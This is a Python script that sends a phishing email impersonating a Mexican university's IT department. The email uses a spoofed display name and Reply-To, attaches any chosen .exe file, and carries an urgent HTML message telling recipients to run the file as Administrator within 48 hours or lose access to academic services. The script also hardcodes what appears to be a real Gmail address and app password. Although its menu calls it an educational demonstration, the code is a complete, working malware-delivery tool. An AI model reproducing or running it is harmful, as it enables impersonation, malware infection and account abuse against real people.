#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

def send_utn_spoofed_email():
    # CONFIGURACION DE CUENTA REAL
    gmail_user = "piedrozadaniel@gmail.com"
    gmail_password = "xuawyofxhwudgrdn"
    
    # CONFIGURACION DE SUPLANTACION MEJORADA
    display_name = "Departamento de Sistemas UTN"
    spoofed_email = "sistemas@utn.edu.mx"
    
    # SOLICITAR CORREO DESTINO
    print("\n--- CONFIGURACION DE DESTINO ---")
    target_email = input("Ingrese el correo destino: ").strip()
    
    if not target_email:
        print("Error: Debe ingresar un correo destino")
        return
    
    # MENU DE SELECCION DE ARCHIVO EXE
    print("\n--- SELECCION DE ARCHIVO EXE ---")
    print("Opciones:")
    print("1. Buscar y seleccionar archivo EXE en el sistema")
    print("2. Usar ruta manualmente")
    
    archivo_opcion = input("Seleccione opcion (1-2): ").strip()
    
    attachment_path = ""
    
    if archivo_opcion == "1":
        # Buscar archivos EXE en el directorio actual y subdirectorios
        exe_files = []
        for root, dirs, files in os.walk("."):
            for file in files:
                if file.lower().endswith('.exe'):
                    full_path = os.path.join(root, file)
                    exe_files.append(full_path)
        
        if exe_files:
            print("\nArchivos EXE encontrados:")
            for i, exe_file in enumerate(exe_files, 1):
                print(f"{i}. {exe_file}")
            
            try:
                seleccion = int(input(f"\nSeleccione un archivo (1-{len(exe_files)}): "))
                if 1 <= seleccion <= len(exe_files):
                    attachment_path = exe_files[seleccion-1]
                    print(f"Archivo seleccionado: {attachment_path}")
                else:
                    print("Seleccion invalida")
                    return
            except ValueError:
                print("Por favor ingrese un numero valido")
                return
        else:
            print("No se encontraron archivos EXE en el directorio actual")
            print("Usando opcion de ruta manual...")
            archivo_opcion = "2"
    
    if archivo_opcion == "2" or not attachment_path:
        attachment_path = input("Ingrese la ruta completa del archivo EXE: ").strip()
        # Limpiar comillas si las hay
        attachment_path = attachment_path.strip('"\'')
    
    # Verificar que el archivo existe
    if not os.path.exists(attachment_path):
        print(f"Error: El archivo {attachment_path} no existe")
        return
    
    if not attachment_path.lower().endswith('.exe'):
        print("Advertencia: El archivo seleccionado no tiene extension .exe")
        confirmar = input("¿Desea continuar? (s/n): ").lower()
        if confirmar != 's':
            return
    
    print(f"Archivo confirmado: {attachment_path}")
    print(f"Tamaño del archivo: {os.path.getsize(attachment_path)} bytes")
    
    # CONTENIDO HTML MEJORADO
    subject = "Actualizacion Critica SIIENET v4.5 - Requiere Instalacion Inmediata"
    
    # Obtener el nombre del archivo sin la ruta
    nombre_archivo = os.path.basename(attachment_path)
    
    html_body = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <style>
            body {{
                font-family: 'Segoe UI', Arial, sans-serif;
                line-height: 1.6;
                color: #333;
                max-width: 700px;
                margin: 0 auto;
                padding: 20px;
                background-color: #f9f9f9;
            }}
            .header {{
                background: linear-gradient(135deg, #0056a6, #003366);
                color: white;
                padding: 25px;
                border-radius: 10px 10px 0 0;
                text-align: center;
            }}
            .content {{
                background: white;
                padding: 30px;
                border-radius: 0 0 10px 10px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            }}
            .urgent {{
                background-color: #fff3cd;
                border: 2px solid #ffc107;
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
                text-align: center;
            }}
            .button {{
                display: inline-block;
                background: linear-gradient(135deg, #28a745, #20c997);
                color: white;
                padding: 15px 30px;
                text-decoration: none;
                border-radius: 25px;
                font-weight: bold;
                margin: 15px 0;
                box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            }}
            .features {{
                background: #e8f4fd;
                border-left: 4px solid #0056a6;
                padding: 15px;
                margin: 20px 0;
            }}
            .footer {{
                text-align: center;
                margin-top: 30px;
                padding: 20px;
                background: #f8f9fa;
                border-radius: 8px;
                font-size: 12px;
                color: #666;
            }}
            .logo {{
                font-size: 24px;
                font-weight: bold;
                margin-bottom: 10px;
            }}
            h1 {{
                color: #0056a6;
                border-bottom: 2px solid #0056a6;
                padding-bottom: 10px;
            }}
            h2 {{
                color: #003366;
            }}
            .highlight {{
                background-color: #ffffcc;
                padding: 2px 5px;
                border-radius: 3px;
            }}
            .file-info {{
                background: #e7f3ff;
                padding: 15px;
                border-radius: 8px;
                margin: 15px 0;
            }}
        </style>
    </head>
    <body>
        <div class="header">
            <div class="logo">UNIVERSIDAD TECNOLÓGICA NACIONAL</div>
            <h2 style="color: white; margin: 0;">Departamento de Sistemas</h2>
        </div>
        
        <div class="content">
            <h1>Actualización Crítica del Sistema SIIENET</h1>
            
            <div class="urgent">
                <h2 style="color: #856404;">ACTUALIZACIÓN REQUERIDA</h2>
                <p><strong>Fecha Límite: 48 horas</strong></p>
                <p>Su sistema requiere esta actualización para mantener el acceso a los servicios académicos.</p>
            </div>
            
            <p>Estimado usuario del sistema SIIENET,</p>
            
            <p>Como parte de nuestro compromiso con la mejora continua y la seguridad de nuestros sistemas, 
            hemos desarrollado la versión 4.5 del Sistema Integral de Información Educativa Nacional (SIIENET).</p>
            
            <div class="file-info">
                <h3>ARCHIVO DE ACTUALIZACIÓN:</h3>
                <p><strong>Nombre:</strong> {nombre_archivo}</p>
                <p><strong>Tamaño:</strong> {os.path.getsize(attachment_path)} bytes</p>
                <p><strong>Versión:</strong> 4.5.0.2025</p>
            </div>
            
            <div class="features">
                <h3>NUEVAS CARACTERÍSTICAS EN VERSIÓN 4.5:</h3>
                <ul>
                    <li><strong>Mejora de Seguridad:</strong> Protocolos de encriptación mejorados</li>
                    <li><strong>Rendimiento:</strong> 40% más rápido en carga de datos</li>
                    <li><strong>Nueva Interfaz:</strong> Diseño intuitivo y responsive</li>
                    <li><strong>Reportes Automáticos:</strong> Generación automática de reportes académicos</li>
                    <li><strong>Integración Cloud:</strong> Sincronización en tiempo real con servidores centrales</li>
                </ul>
            </div>
            
            <h2>INSTRUCCIONES DE INSTALACIÓN:</h2>
            <ol>
                <li>Descargue el archivo adjunto <span class="highlight">{nombre_archivo}</span></li>
                <li>Cierre todas las aplicaciones antes de instalar</li>
                <li>Ejecute el archivo como <strong>Administrador</strong></li>
                <li>Siga las instrucciones del asistente de instalación</li>
                <li>Reinicie su equipo cuando finalice la instalación</li>
            </ol>
            
            <div style="text-align: center;">
                <div class="button">DESCARGAR ACTUALIZACIÓN</div>
                <p><small>(El archivo ya está adjunto en este correo)</small></p>
            </div>
            
            <div style="background: #d4edda; padding: 15px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #155724; margin: 0;">BENEFICIOS INMEDIATOS:</h3>
                <p style="margin: 10px 0;">• Acceso a nuevas funcionalidades académicas<br>
                   • Mejor experiencia de usuario<br>
                   • Protección contra vulnerabilidades conocidas<br>
                   • Soporte técnico garantizado</p>
            </div>
            
            <p><strong>Importante:</strong> Los usuarios que no actualicen su sistema dentro del plazo establecido 
            perderán temporalmente el acceso a los servicios académicos en línea.</p>
            
            <div class="footer">
                <p><strong>Departamento de Sistemas - UTN</strong><br>
                Teléfono: +52 55 5628 7000 Ext. 1502<br>
                Email: sistemas@utn.edu.mx<br>
                Soporte Técnico: 24/7</p>
                
                <p style="font-size: 10px; color: #999;">
                    Este es un mensaje automático. Por favor no responda a este correo.<br>
                    Universidad Tecnológica Nacional © 2025 - Todos los derechos reservados.
                </p>
            </div>
        </div>
    </body>
    </html>
    """
    
    # CONSTRUCCION DEL EMAIL CON ADJUNTO
    msg = MIMEMultipart()
    
    # SPOOFING VISUAL mejorado
    msg['From'] = f'"{display_name}" <{gmail_user}>'
    msg['To'] = target_email
    msg['Subject'] = subject
    msg['Reply-To'] = spoofed_email
    
    # Adjuntar contenido HTML
    msg.attach(MIMEText(html_body, 'html'))
    
    try:
        # Adjuntar archivo EXE real
        with open(attachment_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        
        encoders.encode_base64(part)
        part.add_header(
            'Content-Disposition',
            f'attachment; filename="{os.path.basename(attachment_path)}"',
        )
        msg.attach(part)
        print(f"Archivo adjuntado: {attachment_path}")
        print(f"Nombre en el correo: {os.path.basename(attachment_path)}")
        
    except Exception as e:
        print(f"Error al adjuntar archivo: {e}")
        return

    # ENVIO DEL CORREO SPOOFED MEJORADO
    try:
        print("\nINICIANDO ENVIO DE CORREO...")
        print("=" * 55)
        
        print("Conectando a servidor Gmail...")
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        
        print("Autenticando con App Password...")
        server.login(gmail_user, gmail_password)
        
        print("Enviando correo con adjunto...")
        server.sendmail(gmail_user, target_email, msg.as_string())
        server.quit()
            
        print("ENVIO EXITOSO!")
        print("=" * 55)
        print(f"REMITENTE VISUAL: {display_name}")
        print(f"REPLY-TO: {spoofed_email}") 
        print(f"DESTINO: {target_email}")
        print(f"ASUNTO: {subject}")
        print(f"ARCHIVO ENVIADO: {attachment_path}")
        print(f"NOMBRE EN CORREO: {os.path.basename(attachment_path)}")
        print(f"TAMAÑO: {os.path.getsize(attachment_path)} bytes")
        print("\nCARACTERISTICAS DEL CORREO:")
        print("   - Diseño HTML profesional")
        print("   - Archivo EXE real adjuntado")
        print("   - Informacion detallada del archivo")
        print("   - Mensaje de actualizacion urgente")
        
    except Exception as e:
        print(f"ERROR: {e}")

def buscar_archivos_exe():
    """Funcion para buscar archivos EXE en el sistema"""
    print("\n--- BUSQUEDA DE ARCHIVOS EXE ---")
    print("Buscando archivos EXE en el directorio actual...")
    
    exe_files = []
    for root, dirs, files in os.walk("."):
        for file in files:
            if file.lower().endswith('.exe'):
                full_path = os.path.join(root, file)
                # Obtener ruta relativa
                rel_path = os.path.relpath(full_path)
                exe_files.append(rel_path)
    
    return exe_files

def configurar_cuenta_gmail():
    print("\n--- CONFIGURACION DE CUENTA GMAIL ---")
    print("Configuracion actual:")
    print(f"Gmail User: piedrozadaniel@gmail.com")
    print("\nPara cambiar la cuenta Gmail, modifique las variables:")
    print("gmail_user y gmail_password en el codigo")
    print("\nNOTA: Necesita una Contrasena de Aplicacion de Google")
    print("para poder enviar correos mediante SMTP")

def mostrar_info():
    print("\n--- INFORMACION DEL SISTEMA ---")
    print("Sistema: Email Spoofing Demonstration")
    print("Version: 4.0")
    print("Python: 3.14.0")
    print("Caracteristicas:")
    print("  - Seleccion de archivos EXE propios")
    print("  - Busqueda automatica de archivos EXE")
    print("  - Diseño HTML/CSS profesional")
    print("  - Informacion detallada del archivo en el correo")
    print("\nADVERTENCIA: Este sistema es solo para fines educativos.")
    print("El uso malintencionado de estas tecnicas es ilegal.")

def menu_principal():
    while True:
        print("\n" + "="*50)
        print("SISTEMA DE DEMOSTRACION DE EMAIL SPOOFING")
        print("="*50)
        print("1. Enviar correo de demostracion")
        print("2. Buscar archivos EXE disponibles")
        print("3. Configurar cuenta Gmail")
        print("4. Informacion del sistema")
        print("5. Salir")
        print("-"*50)
        
        opcion = input("Seleccione una opcion (1-5): ")
        
        if opcion == "1":
            print("\nPreparando envio de correo...")
            send_utn_spoofed_email()
            input("\nPresione Enter para continuar...")
            
        elif opcion == "2":
            exe_files = buscar_archivos_exe()
            if exe_files:
                print(f"\nSe encontraron {len(exe_files)} archivos EXE:")
                for i, exe_file in enumerate(exe_files, 1):
                    file_size = os.path.getsize(exe_file)
                    print(f"{i}. {exe_file} ({file_size} bytes)")
            else:
                print("No se encontraron archivos EXE en el directorio actual")
            input("\nPresione Enter para continuar...")
                
        elif opcion == "3":
            configurar_cuenta_gmail()
            input("\nPresione Enter para continuar...")
                
        elif opcion == "4":
            mostrar_info()
            input("\nPresione Enter para continuar...")
            
        elif opcion == "5":
            print("\nSaliendo del sistema...")
            break
            
        else:
            print("\nOpcion no valida. Por favor, seleccione 1-5.")

if __name__ == "__main__":
    print("DEMOSTRACION: Email Spoofing Avanzado - UTN")
    print("Version 4.0 - Con seleccion de archivos EXE propios")
    menu_principal()
